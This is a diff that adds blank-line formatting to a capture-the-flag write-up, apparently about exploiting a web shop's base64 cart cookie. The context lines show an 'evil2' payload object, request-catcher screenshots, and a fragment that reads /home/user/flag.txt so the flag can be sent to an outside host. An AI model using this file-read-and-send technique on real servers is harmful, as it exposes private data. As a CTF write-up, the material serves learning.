@@ -10,11 +10,15 @@ There are two hints here:
 I tried all the stores to see if the checkout was open on any of them, but they were not (and stores 3 and 4 were down).
 
 The **/cart** URL used a cookie called also **cart**, to store the items, encoded in base64:
+
 **Base64:**
+
 ```
 eyJpdGVtcyI6eyIwIjp7Im5hbWUiOiJIYXdvcnRoaW9wc2lzIGF0dGVudWF0YSIsInByaWNlIjoxOS45OSwiY291bnQiOjF9LCIyIjp7Im5hbWUiOiJEcmFjYWVuYSB0cmlmYXNjaWF0YSIsInByaWNlIjoxNC45OSwiY291bnQiOjF9fX0K`
 ```
+
 **Decoded:** 
+
 ```
 {"items":{"0":{"name":"Haworthiopsis attenuata","price":19.99,"count":1},"2":{"name":"Dracaena trifasciata","price":14.99,"count":1}}}
 ````
@@ -118,6 +122,7 @@ evil2 = {
 ```
 
 And after that:
+
 ![Request Catcher - Round 1](https://github.com/Neptunians/nahamcon-ctf/blob/master/seriously/request_catcher_screenshot_1.png)
 
 So, let's include a block to get the flag content and send it, using base64 to avoid any problems:
@@ -132,6 +137,7 @@ fs.readFile('/home/user/flag.txt', function(err, data) {
 ```
 
 And something happens:
+
 ![Request Catcher - Round 1](https://github.com/Neptunians/nahamcon-ctf/blob/master/seriously/request_catcher_screenshot_1.png)
 
 Decodes to:
